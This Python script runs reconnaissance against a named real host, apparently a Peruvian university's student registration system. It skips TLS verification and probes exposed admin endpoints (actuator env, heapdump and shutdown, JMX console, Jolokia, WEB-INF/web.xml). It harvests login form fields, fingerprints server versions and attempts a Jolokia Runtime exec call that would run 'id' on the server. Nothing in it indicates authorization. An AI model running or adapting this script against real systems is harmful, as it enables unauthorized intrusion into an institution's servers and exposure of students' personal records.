#!/usr/bin/env python3
import os, sys
os.environ["PYTHONIOENCODING"] = "utf-8"
if sys.stdout.encoding != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

import requests, urllib3, re, time
urllib3.disable_warnings()

base = 'https://registro.uns.edu.pe'
print(f'=== registro.uns.edu.pe HTTPS con redirects ===\n')

paths = [
    '/WebAlumno/', '/WebAlumno/faces/login.xhtml',
    '/WebAlumno/faces/pages/expedientePersonal.xhtml',
    '/console', '/console/', '/noredirect.html',
    '/management', '/management/',
    '/jolokia/', '/jolokia/read/java.lang:type=Runtime',
    '/actuator', '/actuator/health', '/actuator/env',
    '/actuator/beans', '/actuator/mappings',
    '/actuator/heapdump', '/actuator/shutdown',
    '/swagger-ui.html', '/v2/api-docs', '/v3/api-docs',
    '/rest/', '/api/', '/services/',
    '/invoker/JMXInvokerServlet', '/jmx-console/',
    '/robots.txt', '/status', '/health',
    '/index.jsp', '/index.html',
]

for path in paths:
    try:
        r = requests.get(
            f'{base}{path}',
            verify=False, timeout=8, allow_redirects=True,
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        if r.status_code not in [404]:
            tm = re.search(r'<title>([^<]+)</title>', r.text, re.I)
            if tm:
                t = tm.group(1).strip()
            else:
                t = r.text[:80].replace('\n', ' ').strip()
            powered = r.headers.get('X-Powered-By', '')
            extra = f' [{powered}]' if powered else ''
            icon = '[+]' if r.status_code == 200 else '[?]'
            print(f'{icon} HTTP {r.status_code} | {path} | {t[:80]}{extra}')

            if r.status_code == 200 and len(r.content) > 100:
                form_pat = re.compile(r'<form[^>]*action="([^"]+)"', re.I)
                input_pat = re.compile(r'<input[^>]*name="([^"]+)"', re.I)
                forms = form_pat.findall(r.text)
                inputs = input_pat.findall(r.text)
                if forms:
                    print(f'   Forms: {forms[:3]}')
                if inputs:
                    print(f'   Inputs: {inputs[:8]}')
                jsf = re.search(r'javax\.faces|jakarta\.faces|PrimeFaces|ICEfaces|JSF', r.text)
                if jsf:
                    print(f'   Framework JSF detectado: {jsf.group(0)}')
                # Buscar version WildFly
                wf = re.search(r'WildFly[\s/]+([\d.]+)', r.text)
                if wf:
                    print(f'   WildFly version: {wf.group(1)}')
    except Exception as e:
        pass
    time.sleep(0.1)

print()
print('=== Jolokia / JMX directo ===')
jolokia_paths = [
    '/jolokia/',
    '/jolokia/read/java.lang:type=Runtime',
    '/jolokia/read/java.lang:type=OperatingSystem',
    '/jolokia/read/java.lang:type=Runtime/SystemProperties',
    '/jolokia/exec/java.lang:type=Runtime/exec/id',
]
for p in jolokia_paths:
    try:
        r2 = requests.get(
            f'{base}{p}', verify=False, timeout=8,
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        if r2.status_code == 200:
            print(f'[!!!] JOLOKIA ACTIVO: {p}')
            print(f'      {r2.text[:400]}')
        elif r2.status_code not in [404]:
            print(f'[?] HTTP {r2.status_code} | {p}')
    except Exception as e:
        pass

print()
print('=== WebAlumno deep recon ===')
wa_paths = [
    '/WebAlumno/faces/pages/login.xhtml',
    '/WebAlumno/faces/pages/expedientePersonal.xhtml',
    '/WebAlumno/faces/pages/matricula.xhtml',
    '/WebAlumno/faces/pages/notas.xhtml',
    '/WebAlumno/faces/pages/horario.xhtml',
    '/WebAlumno/faces/pages/constancia.xhtml',
    '/WebAlumno/rest/',
    '/WebAlumno/api/',
    '/WebAlumno/javax.faces.resource/',
    '/WebAlumno/WEB-INF/web.xml',
]
for p in wa_paths:
    try:
        r3 = requests.get(
            f'{base}{p}', verify=False, timeout=8, allow_redirects=True,
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        if r3.status_code not in [404]:
            tm3 = re.search(r'<title>([^<]+)</title>', r3.text, re.I)
            t3 = tm3.group(1).strip() if tm3 else r3.text[:60].replace('\n', ' ')
            icon = '[+]' if r3.status_code == 200 else '[?]'
            print(f'{icon} HTTP {r3.status_code} | {p} | {t3[:70]}')
    except:
        pass

print('\n=== Completado ===')
